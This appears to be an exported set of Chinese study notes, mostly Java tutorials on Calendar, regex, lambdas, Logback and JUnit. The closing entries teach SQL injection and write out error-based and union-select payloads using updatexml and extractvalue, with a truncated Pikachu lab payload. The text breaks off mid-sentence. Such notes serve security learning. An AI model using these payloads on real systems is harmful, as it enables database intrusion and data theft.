javax.xml.crypto.Data;\nimport java.util.Calendar;\nimport java.util.Date;\n\npublic class CalendarTest01 {\n    public static void main(String[] args) {\n        //拿到系统此时的日历对象\n        Calendar c=Calendar.getInstance();\n        System.out.println(c);\n\n    //    获取年份\n        int year=c.get(Calendar.YEAR);\n    //    获取月份\n        int month=c.get(Calendar.MONTH)+1;//月份比较特殊，范围在0--11，所以需要自己手动加1\n    //    获取日\n        int day=c.get(Calendar.DAY_OF_MONTH);\n        System.out.println(year+\"年\"+month+\"月\"+day+\"日\");\n\n    //    修改某个字段的值\n        c.set(Calendar.DAY_OF_MONTH,11);\n        System.out.println(c.get(Calendar.DAY_OF_MONTH));\n\n    //    增加某个字段的值\n        c.add(Calendar.DAY_OF_MONTH,8);//加8天之后是\n        System.out.println(c.get(Calendar.YEAR)+\"年\"+(c.get(Calendar.MONTH)+1)+\"月\"+c.get(Calendar.DAY_OF_MONTH)+\"日\");\n\n    //    拿到此刻日期\n        Date date=c.getTime();\n        System.out.println(date);\n\n    //    拿到毫秒级时间戳\n        long biglong=c.getTimeInMillis();\n        System.out.println(biglong);\n    }\n}\n```\n\noutput\n\n```java\njava.util.GregorianCalendar[time=1662987959416,areFieldsSet=true,areAllFieldsSet=true,lenient=true,zone=sun.util.calendar.ZoneInfo[id=\"Asia/Shanghai\",offset=28800000,dstSavings=0,useDaylight=false,transitions=19,lastRule=null],firstDayOfWeek=1,minimalDaysInFirstWeek=1,ERA=1,YEAR=2022,MONTH=8,WEEK_OF_YEAR=38,WEEK_OF_MONTH=3,DAY_OF_MONTH=12,DAY_OF_YEAR=255,DAY_OF_WEEK=2,DAY_OF_WEEK_IN_MONTH=2,AM_PM=1,HOUR=9,HOUR_OF_DAY=21,MINUTE=5,SECOND=59,MILLISECOND=416,ZONE_OFFSET=28800000,DST_OFFSET=0]\n2022年9月12日\n11\n2022年9月19日\nMon Sep 19 21:05:59 CST 2022\n1663592759416\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3203_%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F":{"title":"3203_正则表达式","content":"# 3203_正则表达式\n\n用于匹配字符规则\n```java\npackage d6_regex;  \n  \npublic class RegexTest01 {  \n    public static void main(String[] args) {  \n        System.out.println(checkQQ(\"2231235\"));  \n        System.out.println(checkQQ(\"123aad212\"));  \n    }  \n  \n    private static boolean checkQQ(String qq) {  \n        return  qq!=null \u0026\u0026 qq.matches(\"\\\\d{6,10}\");  \n    }  \n}\n```\noutput\n```java\ntrue\nfalse\n\n```\n\n## 例子\n```java\npackage d6_regex;  \n  \nimport com.sun.org.apache.xpath.internal.WhitespaceStrippingElementMatcher;  \n  \nimport java.security.interfaces.RSAKey;  \nimport java.util.regex.Matcher;  \nimport java.util.regex.Pattern;  \n  \npublic class RegexTest02 {  \n    public static void main(String[] args) {  \n    //    校验电话号码  \n        System.out.println(\"19221254565\".matches(\"1[3-9]\\\\d{9}\"));  \n        System.out.println(\"1922125455\".matches(\"1[3-9]\\\\d{9}\"));  \n        //校验邮箱  \n        System.out.println(\"223055@qq.com\".matches(\"\\\\d{2,25}@[a-zA-Z0-9]{2,10}(.[a-zA-Z0-9]{2,10}){1,2}\"));  \n        System.out.println(\"223055@bj.edu.com\".matches(\"\\\\d{2,25}@[a-zA-Z0-9]{2,10}(.[a-zA-Z0-9]{2,10}){1,2}\"));  \n    //    电话号码  \n        System.out.println(\"0211-12512\".matches(\"0\\\\d{2,6}-?\\\\d{5,20}\"));  \n        System.out.println(\"021112512\".matches(\"0\\\\d{2,6}-?\\\\d{5,20}\"));  \n        System.out.println(\"211-12512\".matches(\"0\\\\d{2,6}-?\\\\d{5,20}\"));  \n  \n        /* 匹配字符串 */        String str=\"张三jhhj李四jfksjf王麻子jfksl\";  \n        String[] strArrs=str.split(\"\\\\w+\");  \n        for (String s:strArrs  \n             ) {  \n            System.out.print(s+\"\\t\");  \n        }  \n  \n        /* 爬取规则 */        String str2=\"fakfjlajdf15513543245李四fjksljf,1232@163.edu（）dfaf16525554621fjslk\";  \n    //    1. 定义匹配规则：邮箱或者电话号码  \n        String regex=\"(1[3-9]\\\\d{9})|\\\\d{2,25}@[a-zA-Z0-9]{2,10}(.[a-zA-Z0-9]{2,10}){1,2}\";  \n    //    2.把这个爬取规则编译成对象  \n        Pattern pattern=Pattern.compile(regex);  \n    //    3.得到一个内容匹配器对象  \n        Matcher matcher=pattern.matcher(str2);  \n    //    匹配器去查找  \n        while (matcher.find()){  \n            String s=matcher.group();  \n            System.out.println(s);  \n        }  \n  \n    }  \n}\n```\n\noutput\n```java\ntrue\nfalse\ntrue\ntrue\ntrue\ntrue\nfalse\n张三\t李四\t王麻子\t15513543245\n1232@163.edu\n16525554621\n\nProcess finished with exit code 0\n\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3203_Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F":{"title":"3203_Lambda表达式","content":"# 3203_Lambda表达式\n\n**只能简化函数式接口的匿名内部类的写法**\n1. 必须是接口，有且只有一个抽象方法\n2. 一般这个接口上会加函数式接口的注解`@FunctionalInterface`\n\n作用\n\n简化匿名内部类的代码写法（Java8的一个新特性)\n\n## 书写格式\n```java\n(匿名内部类的被重写的形参列表)-\u003e{\n\t被重写的方法体;\n};\n```\n### 书写格式进一步简化\n1. 括号的形参类型可以不写\n2. 如果只有一个参数，参数类型可以省略，同时`()`可以省略\n3. 如果Lambda的方法体只有一行代码，可以**省略大括号**不写，同时需要**省略分号**；\n4. 如果只有一行代码，且是return语句，可以省略`return`不写，分号也需要省略\n\n## 实例\n```java\npackage LambdaTest;  \n  \nimport java.security.PublicKey;  \nimport java.sql.SQLOutput;  \n  \npublic class Test01 {  \n    public static void main(String[] args) {  \n        String name = \"张三\";  \n        // 采用匿名内部类  \n        Swimming swim1 = new Swimming() {  \n            @Override  \n            public void swim() {  \n                System.out.println(\"swimming\");  \n            }  \n        };  \n        swim1.swim();  \n  \n        //    采用Lambda表达式简化格式  \n        Swimming swim2 = () -\u003e {  \n            System.out.println(name + \"在游泳\");  \n        };  \n        swim2.swim();  \n    //        采用lambda表格式2  \n        go(()-\u003e{  \n            System.out.println(\"在河边游泳\");  \n        });  \n  \n    }  \n    public  static  void go(Swimming s){  \n        System.out.println(\"start---\");  \n        s.swim();  \n        System.out.println(\"end-----\");  \n    }  \n}  \n  \ninterface Swimming {  \n    void swim();  \n}\n```\n\noutput\n```java\nswimming\n张三在游泳\nstart---\n在河边游泳\nend-----\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3204_%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E7%BA%A2%E9%BB%91%E6%A0%91":{"title":"3204_二叉树、平衡二叉树、红黑树","content":"# 3204_二叉树、平衡二叉树、红黑树\n\n二叉树，查找二叉树（可能会变成瘸子，导致一边高一边低）\n## 平衡二叉树\n左右子节点的度数不超过1,\n\u003e[!faq]+ 平衡二叉树添加元素的过程中出现了不平衡怎么解决\n\u003e1. 左左：右旋\n\u003e2. 右右：左旋\n\u003e3. 左右：找到问题子树，将其左旋，然后将根树进行右旋\n\u003e4. 右左：找到问题子树，将其右旋，然后将根树进行左旋\n\n\n## 红黑树\n优点：**增删改查性能都很好**\n### 规则\n1. **根节点必须是黑色**，每一个节点是红色或者黑色\n2. 每一个节点**没有子节点或者父节点**，就将其**设置为黑色的`Nil`**（大致就是null）\n3. **红色节点的子节点必须是黑色**，不能出现两个红色父子节点相连的情况\n4. 每一个节点，**从该节点到所有子节点的简单路径上的黑色节点数是相同的**","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3205_%E6%97%A5%E5%BF%97%E6%8A%80%E6%9C%AF":{"title":"3205_日志技术","content":"# 3205_日志技术\n\n## 常用的日志规范\n日志规范一般是一些接口，常用的有\n1. Commons  Logging\n2. Simple Logging facade for Java\n## 常用的日志框架\n1. Log4j\n2. Logback(**性能好**)\n\n## Logback日志框架\n### 组成部分\n由三部分组成\n1. `logback-core`:为其余两个模块建立基础\n2. `logback-classic`:log4j的改良，同时完整实现了slf4j API\n3. `logback-access`:与Tomcat与Jetty等容器集成，**提供http访问日志功能**\n\n### 基本使用\n官网：https://logback.qos.ch/manual/index.html  \n1. 导入jar包到项目中，添加项目依赖（右击，选择`Add as  Library`）\n\t```java\n\t\tlogback-classic-1.2.3.jar\n\t\tlogback-core-1.2.3.jar\n\t\tslf4j-api-1.7.26.jar\n\t```\n1. 将Logback的核心配置文件`logback.xml`拷贝到`src`目录下\n2. 创建Logback的日志对象\n3. 使用日志对象Logger调用方法输出日志信息（根据配置信息的设定进行输出）\n\n### 例子\n```java\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e  \n\u003cconfiguration\u003e  \n    \u003c!--  \n        CONSOLE ：表示当前的日志信息是可以输出到控制台的。  \n    --\u003e  \n    \u003cappender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\"\u003e  \n        \u003c!--输出流对象 默认 System.out 改为 System.err--\u003e        \u003ctarget\u003eSystem.out\u003c/target\u003e  \n        \u003cencoder\u003e  \n            \u003c!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度  \n                %msg：日志消息，%n是换行符--\u003e  \n            \u003cpattern\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} [%-5level]  %c [%thread] : %msg%n\u003c/pattern\u003e  \n        \u003c/encoder\u003e  \n    \u003c/appender\u003e  \n  \n    \u003c!-- File是输出的方向通向文件的 --\u003e  \n    \u003cappender name=\"FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"\u003e  \n        \u003cencoder\u003e  \n            \u003cpattern\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u003c/pattern\u003e  \n            \u003ccharset\u003eutf-8\u003c/charset\u003e  \n        \u003c/encoder\u003e  \n        \u003c!--日志输出路径--\u003e  \n        \u003cfile\u003eC:/code/itheima-data.log\u003c/file\u003e  \n        \u003c!--指定日志文件拆分和压缩规则--\u003e  \n        \u003crollingPolicy  \n                class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\"\u003e  \n            \u003c!--通过指定压缩文件名称，来确定分割文件方式--\u003e  \n            \u003cfileNamePattern\u003eC:/code/itheima-data2-%d{yyyy-MMdd}.log%i.gz\u003c/fileNamePattern\u003e  \n            \u003c!--文件拆分大小--\u003e  \n            \u003cmaxFileSize\u003e1MB\u003c/maxFileSize\u003e  \n        \u003c/rollingPolicy\u003e  \n    \u003c/appender\u003e  \n  \n    \u003c!--  \n  \n    level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF   ， 默认debug  \n    \u003croot\u003e可以包含零个或多个\u003cappender-ref\u003e元素，标识这个输出位置将会被本日志级别控制。  \n    --\u003e  \n    \u003croot level=\"ALL\"\u003e  \n        \u003cappender-ref ref=\"CONSOLE\"/\u003e  \n        \u003cappender-ref ref=\"FILE\" /\u003e  \n    \u003c/root\u003e  \n\u003c/configuration\u003e\n```\n\noutput\n```java\n2022-09-20 19:01:18.601 [DEBUG]  Test.class [main] : 日志打印\n2022-09-20 19:01:18.603 [INFO ]  Test.class [main] : INFO进行打印\n2022-09-20 19:01:18.604 [TRACE]  Test.class [main] : a=23\n2022-09-20 19:01:18.604 [TRACE]  Test.class [main] : b=0\n2022-09-20 19:01:18.604 [ERROR]  Test.class [main] : 功能异常java.lang.ArithmeticException: / by zero\n```\n\n\n### 日志级别\n设定：\n```xml\n\u003croot level=\"INFO\"\u003e\n```\ntrace\u003cdebug\u003cinfo\u003cwarn\u003cerror\n\n默认是日志级别是：`Debug`\n设置级别：用于控制日志级别中的哪些是可以输出的，**大于或等于设定日志级别的才可以输出**\n其中`ALL`和`OFF`是打开和关闭打印所有日志信息\n\n### 日志配置文件模板\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e  \n\u003cconfiguration\u003e  \n    \u003c!--  \n        CONSOLE ：表示当前的日志信息是可以输出到控制台的。  \n    --\u003e  \n    \u003cappender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\"\u003e  \n        \u003c!--输出流对象 默认 System.out 改为 System.err--\u003e        \u003ctarget\u003eSystem.out\u003c/target\u003e  \n        \u003cencoder\u003e  \n            \u003c!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度  \n                %msg：日志消息，%n是换行符--\u003e  \n            \u003cpattern\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} [%-5level]  %c [%thread] : %msg%n\u003c/pattern\u003e  \n        \u003c/encoder\u003e  \n    \u003c/appender\u003e  \n  \n    \u003c!-- File是输出的方向通向文件的 --\u003e  \n    \u003cappender name=\"FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"\u003e  \n        \u003cencoder\u003e  \n            \u003cpattern\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u003c/pattern\u003e  \n            \u003ccharset\u003eutf-8\u003c/charset\u003e  \n        \u003c/encoder\u003e  \n        \u003c!--日志输出路径--\u003e  \n        \u003cfile\u003eC:/code/itheima-data.log\u003c/file\u003e  \n        \u003c!--指定日志文件拆分和压缩规则--\u003e  \n        \u003crollingPolicy  \n                class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\"\u003e  \n            \u003c!--通过指定压缩文件名称，来确定分割文件方式--\u003e  \n            \u003cfileNamePattern\u003eC:/code/itheima-data2-%d{yyyy-MMdd}.log%i.gz\u003c/fileNamePattern\u003e  \n            \u003c!--文件拆分大小--\u003e  \n            \u003cmaxFileSize\u003e1MB\u003c/maxFileSize\u003e  \n        \u003c/rollingPolicy\u003e  \n    \u003c/appender\u003e  \n  \n    \u003c!--  \n  \n    level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF   ， 默认debug  \n    \u003croot\u003e可以包含零个或多个\u003cappender-ref\u003e元素，标识这个输出位置将会被本日志级别控制。  \n    --\u003e  \n    \u003croot level=\"ALL\"\u003e  \n        \u003cappender-ref ref=\"CONSOLE\"/\u003e  \n        \u003cappender-ref ref=\"FILE\" /\u003e  \n    \u003c/root\u003e  \n\u003c/configuration\u003e\n```\n\n相关[[【项目3】电影票购票系统]]","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3206_IO%E6%B5%81%E7%9A%84%E8%A1%A5%E5%85%85":{"title":"3206_IO流的补充","content":"# 3206_IO流的补充\n\n## 【案例】文件搜索\n```java\nimport java.io.File;  \nimport java.io.IOException;  \n  \npublic class SearchFile {  \n    public static void main(String[] args) {  \n        searchFile(new File(\"d:/\"), \"新建 文本文档.txt\");  \n    }  \n  \n    private static void searchFile(File dir, String fileName) {  \n        // 1.判断文件夹是否存在  \n        if (dir != null \u0026\u0026 dir.isDirectory()) {  \n            //        2.提取文件夹的列表  \n            File[] files = dir.listFiles();  \n            //    3.判断list是否为空  \n            if (files != null \u0026\u0026 files.length \u003e 0) {  \n                // 4.遍历，文件和文件夹区别对待  \n                for (File file : files) {  \n                    // 如果是文件，就看文件名是否符合  \n                    if (file.isFile()) {  \n                        if (file.getName().equals(fileName)) {  \n                            System.out.println(file.getAbsolutePath());// 找到就返回绝对路径  \n                            try {  \n                                //启动这个文件,必须是exe文件才可以启动  \n                                Runtime r = Runtime.getRuntime();  \n                                r.exec(file.getAbsolutePath());  \n                            } catch (IOException e) {  \n                                e.printStackTrace();  \n                            }  \n                        }  \n                    } else {  \n                        //    如果是文件夹，就继续递归查找  \n                        searchFile(file, fileName);  \n                    }  \n                }  \n            }  \n        } else {  \n            System.out.println(\"不是文件夹，无法查找\");  \n        }  \n  \n    }  \n  \n}\n```\noutput\n```java\nd:\\学习视频\\新建 文本文档.txt\n启动失败\nd:\\新建 文本文档.txt\n启动失败\n```\n\n## 相关\n[[IO流]]","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3207_%E5%96%9D%E9%85%92%E4%B8%8E%E7%93%B6%E5%AD%90%E7%9A%84%E9%97%AE%E9%A2%98":{"title":"3207_喝酒与瓶子的问题","content":"# 3207_喝酒与瓶子的问题\n\n```java\n/**  \n * 目标：啤酒2元1瓶，4个盖子可以换一瓶，2个空瓶可以换一瓶，  \n * 请问10元钱可以喝多少瓶酒，剩余多少空瓶和盖子。  \n * 答案：15瓶 3盖子 1瓶子  \n */  \npublic class Test02 {  \n    public static int totalNumber;//喝酒总数  \n    public static int lastBottleNumber;//最后的空瓶数量  \n    public static int lastCoverNumber;//最后的盖子数量  \n    public static int i=1;  \n    public static void main(String[] args) {  \n        buy(10);  \n        System.out.println(\"喝酒数量：\"+totalNumber+\"空瓶数量：\"+lastBottleNumber+\"盖子数量：\"+lastCoverNumber);  \n    }  \n  \n    private static void buy(int money) {  \n    //    1.计算钱能够买多少瓶啤酒  \n        int buyNumber=money/2;  \n        totalNumber+=buyNumber;//一共买的计算进去  \n    //    2.每次剩下的盖子和空瓶数量  \n        int bottleNumber=lastBottleNumber+buyNumber;  \n        int coverNumber=lastCoverNumber+buyNumber;  \n        System.out.println(\"第\"+(i++)+\"次--买的酒：\"+buyNumber+\"剩余瓶子：\"+bottleNumber+\" 剩余盖子：\"+coverNumber);  \n  \n        //    3.将盖子换算成钱  \n        int allMoney=0;  \n  \n  \n        if(coverNumber \u003e= 4){  \n            allMoney += (coverNumber / 4) * 2;  \n        }  \n        lastCoverNumber = coverNumber % 4;  \n        if (bottleNumber\u003e=2){  \n            allMoney+=(bottleNumber/2)*2;  \n        }  \n        lastBottleNumber=bottleNumber%2;  \n  \n    //    4.如果换算的金钱还够买酒，就递归  \n        if (allMoney\u003e=2){  \n            buy(allMoney);  \n        }  \n    }  \n}\n```\noutput\n```java\n第1次--买的酒：5剩余瓶子：5 剩余盖子：5\n第2次--买的酒：3剩余瓶子：4 剩余盖子：4\n第3次--买的酒：3剩余瓶子：3 剩余盖子：3\n第4次--买的酒：1剩余瓶子：2 剩余盖子：4\n第5次--买的酒：2剩余瓶子：2 剩余盖子：2\n第6次--买的酒：1剩余瓶子：1 剩余盖子：3\n喝酒数量：15空瓶数量：1盖子数量：3\n```\n## about\n[[021-递归]]","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3301_%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95":{"title":"3301_单元测试","content":"# 3301_单元测试\n单元测试框架：JUnit\n\n优点：\n\t1. 灵活选择执行哪些方法，也可以一键执行全部的方法。\n\t2. 一键生成测试报告\n\t3. 每个方法独立运行，不会影响其他的方法测试\n## JUnit的使用方法\n1. 导包，一般idea都是自带了该框架（如果没有，就进行导包或者在idea中对测试方法进行注解@Test的时候，alt+enter的弹出框中进行下载导入![](../../../../assets/Pasted%20image%2020220929163905.png)）\n\t```txt\n\thamcrest-core-1.3.jar\n\tjunit-4.13.1.jar\n\t```\n2. 编写测试代码：必须是**公共无参数无返回值的非静态方法**\n3. 在测试方法上**进行注解，标注`@Test`该方法是测试方法**\n4. 在测试方法中完成被测试方法的正确性测试\n5. 选中测试方法，选择`JUnit`测试，绿色良好，红色失败\n## JUnit常用注解\n1. 开始执行的方法，用来初始化资源\n2. 执行完之后的方法，用来结束资源\n4.0版本的注解\n![](../../../../assets/Pasted%20image%2020220929165144.png)\n5.0版本的注解\n![](../../../../assets/Pasted%20image%2020220930103315.png)\n### eg1\n被测试的方法\n```java\npackage unitTest1;  \n  \npublic class UserService {  \n    public String loginName(String loginName,String password){  \n        if (\"admin\".equals(loginName) \u0026\u0026 \"123456\".equals(password)){  \n            return \"登录成功\";  \n        }else {  \n            return \"登录失败\";  \n        }  \n    }  \n  \n    public void selectName(){  \n        System.out.println(10/0);  \n        System.out.println(\"查询全部用户成功\");  \n    }  \n}\n```\n\n测试方法\n```java\npackage unitTest1;  \n  \nimport org.junit.Assert;  \nimport org.junit.Test;  \n  \n/**  \n * 测试用户服务  \n *  \n * @author 22305 * @date 2022/09/29 */  \npublic class TestUserService {  \n  \n    @Test  \n    public void testLoginName(){  \n    UserService userService=new UserService();  \n    String rs=userService.loginName(\"admin\",\"123456\");  \n  \n    //进行测试结果的正确性测试：断言   如果错误的提示消息 逾期的结果 测试结果  \n        Assert.assertEquals(\"业务可能出现错误\",\"登录成功\",rs);  \n    }  \n  \n    // 错误的密码和账号进行测试  \n    @Test  \n    public void testLoginName2(){  \n        UserService userService=new UserService();  \n        String rs=userService.loginName(\"a\",\"123456\");  \n  \n        //进行测试结果的正确性测试：断言   如果错误的提示消息 逾期的结果 测试结果  \n        Assert.assertEquals(\"业务可能出现错误\",\"登录成功\",rs);  \n    }  \n  \n    @Test  \n    public void testSelectName(){  \n        UserService userService=new UserService();  \n        userService.selectName();  \n    }  \n}\n```\n\noutput: 可以直观的看到那些不符合预期的结果，那些有bug，哪些有异常。\n![](../../../../assets/Pasted%20image%2020220929165233.png)\n\n### 测试Junit框架\n\n测试类\n```java\npackage unitTest2;  \n  \nimport java.lang.reflect.InvocationTargetException;  \nimport java.lang.reflect.Method;  \n  \npublic class AnnotationTest {  \n    @MyTest  \n    public void Test01(){  \n        System.out.println(\"===Test01===\");  \n    }  \n    public void Test02(){  \n        System.out.println(\"===Test02===\");  \n    }  \n    @MyTest  \n    public void Test03(){  \n        System.out.println(\"===Test03===\");  \n    }  \n  \n    /**  \n     * 启动菜单  \n     *  \n     * @param args arg游戏  \n     */  \n    public static void main(String[] args) throws InstantiationException, IllegalAccessException, InvocationTargetException {  \n    //    创建一个对象，因为上面的都是实例方法，需要依靠对象才能执行  \n  \n    //    1.获取字节码对象  \n        Class c=AnnotationTest.class;  \n        Object a=c.newInstance();  \n    //    2.获取方法  \n        Method[] methods=c.getDeclaredMethods();  \n    //    遍历所有方法  \n        for (Method m:methods){  \n        //    如果是有MyTest注解的方法，就可以执行  \n            if (m.isAnnotationPresent(MyTest.class)){  \n                m.invoke(a);  \n            }  \n        }  \n    }  \n}\n```\nMyTest类\n\n```java\npackage unitTest2;  \n  \nimport java.lang.annotation.ElementType;  \nimport java.lang.annotation.Retention;  \nimport java.lang.annotation.RetentionPolicy;  \nimport java.lang.annotation.Target;  \n  \n@Target({ElementType.METHOD,ElementType.TYPE}) //元注解  \n@Retention(RetentionPolicy.RUNTIME)  //运行阶段注解也不会小时，注解一直存在  \npublic @interface MyTest {  \n}\n```\n\noutput：通过获取注解，来判断是否需要测试这个方法，只执行带有MyTest注解的方法，这样来达到测试指定的方法\n\n```txt\n\"C:\\Program Files\\Java\\jdk1.8.0_152\\bin\\java.exe\" \"-javaagent:C:\\Program Files\\JetBrains\\IntelliJ IDEA Community Edition 2022.1.3\\lib\\idea_rt.jar=9708:C:\\Program Files\\JetBrains\\IntelliJ IDEA Community Edition 2022.1.3\\bin\" -Dfile.encoding=UTF-8 -classpath \"C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\charsets.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\deploy.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\access-bridge-64.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\cldrdata.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\dnsns.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\jaccess.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\jfxrt.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\localedata.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\nashorn.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunec.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunjce_provider.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunmscapi.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunpkcs11.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\zipfs.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\javaws.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jce.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jfr.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jfxswt.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jsse.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\management-agent.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\plugin.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\resources.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\rt.jar;D:\\StudyHuigu\\out\\production\\unitTest;C:\\Users\\22305\\.m2\\repository\\junit\\junit\\4.13.1\\junit-4.13.1.jar;C:\\Users\\22305\\.m2\\repository\\org\\hamcrest\\hamcrest-core\\1.3\\hamcrest-core-1.3.jar\" unitTest2.AnnotationTest\n===Test03===\n===Test01===\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3401_%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86":{"title":"3401_动态代理","content":"# 3401_动态代理\n#未完成","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/4.1_2-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F":{"title":"4.1_2 SQL注入之查询方式","content":"\n# SQL注入之查询方式\n\n当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显得原因可能时SQL语句查询方式问题导致，这个时候我们需要用到报错或者盲注进行后续操作，同时在注入的过程中，提前了解其中SQL语句可以更好的选择对应的注入语句。\n\nselect 查询数据\n\n例如：在网站应用中进行数据显示查询操作\n\n```\nselect * from user where id=$id\n```\n## delete 删除数据\n\n例如：后台管理里面删除文章删除用户等操作\n\n```\ndelete from user where id=$id\n```\n## insert 插入数据\n\n例如：在网站应用中进行用户注册添加操作\n\n```\ninser into user （id,name,pass） values(1,'zhangsan','1234')\n```\n## update 更新数据\n\n例如：后台中心数据同步或者缓存操作\n\n```\nupdate user set pwd='p' where id=1\n```\n# SQL注入 报错盲注\n\n盲注就是在注入的过程中，获取的数据不能显示到前端页面，此时，我们需要利用一些方法进行判断或者尝试，我们称之为盲注。我们可以知道盲注分为以下三类：\n### 1.基于布尔的SQL盲注 - 逻辑判断\n\nregexp like ascii left ord mid\n### 2.基于时间的SQL盲注 - 延时判断\n\nif sleep\n### 3.基于报错的SQL盲注 - 报错回显（强制性报错   ）\n\n函数解析：\n\n**updatexml():从目标XML中更改包含所查询值的字符串**\n\n第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC\n\n第二个参数：XPath_string(Xpath格式字符串)\n\n第三个参数：new_value,String格式，替换查找到的符合条件的数据\n\nupdatexml（XML_document,XPath_String,new_value）;\n\n'or updatexml(1,concat(0x7e,database()),0)or'\n\n**extractvalue():从目标XML中返回包含所查询值的字符串**\n\n第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC\n\n第二个参数：XPath_String (Xpath格式字符串)\n\nextractvalue(XML_document,XPath_String)\n\n' or extractvalue(1,concat(0x7e,database())) or'\n\n' union select 1,extractvalue(1,concat(0x7e,(select version())))%23\n\n函数应用：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645865257000/54b8dd46c3ae496297e6610d3d8530d2.png)\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645865257000/c6b4a764335541d290e8c59fb9a1daf2.png)\n\nfloor()向下取整  floor（10.5）  =  10\nrand（）随机数 0 ~ 1之间\ncount（*）函数返回表的记录数。\nconcat函数：将多个字符串连接成一个字符串\ngroup_by 根据by对数据按照哪个字段、进行分组，或者是哪几个字段进行分组（去重）。\n会建立一张临时表\n注意：多个字段分组要使用某个列的聚合函数 cout sum等\n\npikachu insert\n\nusername=x' or (select 1 from (select count(*),concat((select))","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/4.3SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5":{"title":"4.3SQL注入之延时注入","content":"\n\n# 基于时间的SQL盲注 - 延时注入\n\n**知识储备：**\n\nsleep（）：                                     *Sleep* 函数可以使计算机程序（进程，任务或线程）进入休眠\n\nif（）：                                           *i f* 是 计算机编程语言一个关键字，分支结构的一种\n\nmid(a,b,c):                                      从b开始，截取a字符串的c位\n\nsubstr(a,b,c)：                                从b开始，截取字符串a的c长度\n\nleft(database(),1),database() :         left(a,b)从左侧截取a的前b位\n\nlength(database())=8 ：                 判断长度\n\nord=ascii ascii(x)=100：                判断x的ascii值是否为100\n\n在不使用sleep下查询数据所需要的时间：0.03秒\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/86721e1e6625491b89f6de0fd7c8189f.png)\n\n使用sleep可以使查询数据休眠指定时间\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/f3fd6f2e63db44c8adb5d1f84c7150e6.png)\n\nif（a,b,c）：可以理解在java程序中的三目运算符，a条件成立 执行b, 